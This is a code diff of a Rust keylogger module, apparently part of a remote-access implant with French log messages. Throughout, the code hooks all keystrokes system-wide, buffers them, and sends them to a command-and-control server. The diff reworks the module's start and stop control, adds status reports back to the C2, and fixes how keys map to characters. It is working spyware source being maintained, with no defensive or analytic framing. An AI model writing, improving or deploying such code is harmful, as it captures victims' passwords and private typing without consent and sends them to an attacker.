@@ -1,17 +1,18 @@
-use crate::connexion::send_to_c2;
+use crate::connexion::{send_to_c2, send_directive_status};
 use anyhow::{Context, Result};
 use rdev::{Event, EventType, Key};
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::OnceLock;
 use std::sync::{Arc, Mutex};
 use tokio::time::{interval, Duration};
+use std::thread;
 
-static SHOULD_RUN: OnceLock<AtomicBool> = OnceLock::new();
 const MAX_BUFFER_SIZE: usize = 10_000;
 
 lazy_static::lazy_static! {
     static ref GLOBAL_BUFFER: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
     static ref MODIFIERS: Arc<Mutex<ModifierState>> = Arc::new(Mutex::new(ModifierState::default()));
+    static ref SHOULD_RUN: AtomicBool = AtomicBool::new(false);
+    static ref LISTENER_STARTED: AtomicBool = AtomicBool::new(false);
 }
 
 #[derive(Default, Debug)]
@@ -35,37 +36,18 @@ impl KeyLogger {
     }
 
     async fn start(&self, send_interval: Duration) -> Result<()> {
-        let mut listener_handle = tokio::task::spawn_blocking(|| rdev::listen(callback));
         let mut send_interval = interval(send_interval);
 
-        loop {
-            // Vérifie si le flag d'arrêt est activé
-            if let Some(flag) = SHOULD_RUN.get() {
-                if !flag.load(Ordering::SeqCst) {
-                    println!("[keylogger] Arrêt demandé via flag global.");
-                    break;
-                }
-            }
+        while SHOULD_RUN.load(Ordering::SeqCst) {
+            send_interval.tick().await;
 
-            tokio::select! {
-                _ = send_interval.tick() => {
-                    if let Err(e) = self.send_buffer().await {
-                        eprintln!("Erreur lors de l'envoi: {}", e);
-                    }
-                }
-
-                result = &mut listener_handle => {
-                    match result {
-                        Ok(Ok(())) => println!("Listener arrêté normalement"),
-                        Ok(Err(e)) => eprintln!("Erreur du listener: {:?}", e),
-                        Err(e) => eprintln!("Erreur de jointure: {:?}", e),
-                    }
-                    break;
-                }
+            if let Err(e) = self.send_buffer().await {
+                eprintln!("Erreur lors de l'envoi: {}", e);
             }
         }
 
         self.send_buffer().await?;
+
         Ok(())
     }
 
@@ -96,6 +78,10 @@ impl KeyLogger {
 }
 
 fn callback(event: Event) {
+    if !SHOULD_RUN.load(Ordering::SeqCst) {
+        return;
+    }
+
     match event.event_type {
         EventType::KeyPress(key) => {
             let is_modifier = match key {
@@ -274,7 +260,7 @@ fn key_to_string_with_modifiers(key: Key) -> Option<String> {
         | Key::KpMinus
         | Key::Equal
         | Key::LeftBracket
-        | Key::RightBracket) => get_punctuation_or_symbol(k, modifiers.alt_pressed),
+        | Key::RightBracket) => get_punctuation_or_symbol(k, modifiers.shift_pressed),
 
         Key::KpMultiply => "*".to_string(),
         Key::KpPlus => "+".to_string(),
@@ -311,67 +297,119 @@ fn get_letter_case(letter: char, modifiers: &ModifierState) -> String {
     }
 }
 
-fn get_number_or_symbol(key: Key, shift_pressed: bool) -> String {
-    const SHIFT_SYMBOLS: [&str; 10] = [")", "!", "@", "#", "$", "%", "^", "&", "*", "("];
+fn get_number_or_symbol(key: Key, shift: bool) -> String {
+    use Key::*;
+    match (key, shift) {
+        (Num1, true) => "!".to_string(),
+        (Num2, true) => "@".to_string(),
+        (Num3, true) => "#".to_string(),
+        (Num4, true) => "$".to_string(),
+        (Num5, true) => "%".to_string(),
+        (Num6, true) => "^".to_string(),
+        (Num7, true) => "&".to_string(),
+        (Num8, true) => "*".to_string(),
+        (Num9, true) => "(".to_string(),
+        (Num0, true) => ")".to_string(),
 
-    let digit = match key {
-        Key::Num0 | Key::Kp0 => 0,
-        Key::Num1 | Key::Kp1 => 1,
-        Key::Num2 | Key::Kp2 => 2,
-        Key::Num3 | Key::Kp3 => 3,
-        Key::Num4 | Key::Kp4 => 4,
-        Key::Num5 | Key::Kp5 => 5,
-        Key::Num6 | Key::Kp6 => 6,
-        Key::Num7 | Key::Kp7 => 7,
-        Key::Num8 | Key::Kp8 => 8,
-        Key::Num9 | Key::Kp9 => 9,
-        _ => return format!("[{:?}]", key),
-    };
+        (Num0, false) => "0".to_string(),
+        (Num1, false) => "1".to_string(),
+        (Num2, false) => "2".to_string(),
+        (Num3, false) => "3".to_string(),
+        (Num4, false) => "4".to_string(),
+        (Num5, false) => "5".to_string(),
+        (Num6, false) => "6".to_string(),
+        (Num7, false) => "7".to_string(),
+        (Num8, false) => "8".to_string(),
+        (Num9, false) => "9".to_string(),
 
-    if shift_pressed {
-        SHIFT_SYMBOLS[digit].to_string()
-    } else {
-        digit.to_string()
+        (Kp0, _) => "0".to_string(),
+        (Kp1, _) => "1".to_string(),
+        (Kp2, _) => "2".to_string(),
+        (Kp3, _) => "3".to_string(),
+        (Kp4, _) => "4".to_string(),
+        (Kp5, _) => "5".to_string(),
+        (Kp6, _) => "6".to_string(),
+        (Kp7, _) => "7".to_string(),
+        (Kp8, _) => "8".to_string(),
+        (Kp9, _) => "9".to_string(),
+
+        _ => "".to_string(),
     }
 }
 
-fn get_punctuation_or_symbol(key: Key, shift_pressed: bool) -> String {
-    match (key, shift_pressed) {
-        (Key::Dot, true) => ">".to_string(),
+fn get_punctuation_or_symbol(key: Key, shift: bool) -> String {
+    match (key, shift) {
         (Key::Dot, false) => ".".to_string(),
-        (Key::Comma, true) => "<".to_string(),
+        (Key::Dot, true) => ">".to_string(),
         (Key::Comma, false) => ",".to_string(),
-        (Key::SemiColon, true) => ":".to_string(),
+        (Key::Comma, true) => "<".to_string(),
         (Key::SemiColon, false) => ";".to_string(),
-        (Key::Quote, true) => "\"".to_string(),
+        (Key::SemiColon, true) => ":".to_string(),
         (Key::Quote, false) => "'".to_string(),
-        (Key::BackSlash, true) => "|".to_string(),
+        (Key::Quote, true) => "\"".to_string(),
         (Key::BackSlash, false) => "\\".to_string(),
-        (Key::Slash | Key::KpDivide, true) => "?".to_string(),
-        (Key::Slash | Key::KpDivide, false) => "/".to_string(),
-        (Key::Minus | Key::KpMinus, true) => "_".to_string(),
-        (Key::Minus | Key::KpMinus, false) => "-".to_string(),
-        (Key::Equal, true) => "+".to_string(),
+        (Key::BackSlash, true) => "|".to_string(),
+        (Key::Slash, false) => "/".to_string(),
+        (Key::Slash, true) => "?".to_string(),
+        (Key::KpDivide, _) => "/".to_string(),
+        (Key::Minus, false) => "-".to_string(),
+        (Key::Minus, true) => "_".to_string(),
+        (Key::KpMinus, _) => "-".to_string(),
         (Key::Equal, false) => "=".to_string(),
-        (Key::LeftBracket, true) => "{".to_string(),
+        (Key::Equal, true) => "+".to_string(),
         (Key::LeftBracket, false) => "[".to_string(),
-        (Key::RightBracket, true) => "}".to_string(),
+        (Key::LeftBracket, true) => "{".to_string(),
         (Key::RightBracket, false) => "]".to_string(),
-        _ => format!("[{:?}]", key),
+        (Key::RightBracket, true) => "}".to_string(),
+        _ => "".to_string(),
     }
 }
 
-pub async fn start_keylogger(interval_sec: u64) -> Result<()> {
-    let logger = KeyLogger::new();
-    logger.start(Duration::from_secs(interval_sec)).await
+
+fn start_listener_once() {
+    if !LISTENER_STARTED.load(Ordering::SeqCst) {
+        LISTENER_STARTED.store(true, Ordering::SeqCst);
+        thread::spawn(|| {
+            if let Err(error) = rdev::listen(callback) {
+                eprintln!("Erreur dans le listener rdev: {:?}", error);
+            }
+        });
+    }
 }
 
-pub fn init_keylogger_flag() {
-    let _ = SHOULD_RUN.set(AtomicBool::new(true));
+pub async fn start_keylogger(send_interval_sec: u64) -> Result<()> {
+    if SHOULD_RUN.load(Ordering::SeqCst) {
+        println!("[keylogger] Déjà en cours.");
+        return Ok(());
+    }
+
+    SHOULD_RUN.store(true, Ordering::SeqCst);
+
+    start_listener_once();
+
+    let logger = KeyLogger::new();
+
+    let handle = tokio::spawn(async move {
+        logger.start(Duration::from_secs(send_interval_sec)).await
+    });
+
+    tokio::spawn(async move {
+        match handle.await {
+            Ok(Ok(())) => {
+                let _ = send_directive_status("keylogger", "success", "Terminé").await;
+            }
+            Ok(Err(e)) => {
+                let _ = send_directive_status("keylogger", "error", &e.to_string()).await;
+            }
+            Err(e) => {
+                let _ = send_directive_status("keylogger", "error", &format!("Join error: {}", e)).await;
+            }
+        }
+    });
+
+    Ok(())
 }
 
 pub fn stop_keylogger() {
-    if let Some(flag) = SHOULD_RUN.get() {
-        flag.store(false, Ordering::SeqCst);
-    }
+    SHOULD_RUN.store(false, Ordering::SeqCst);
 }
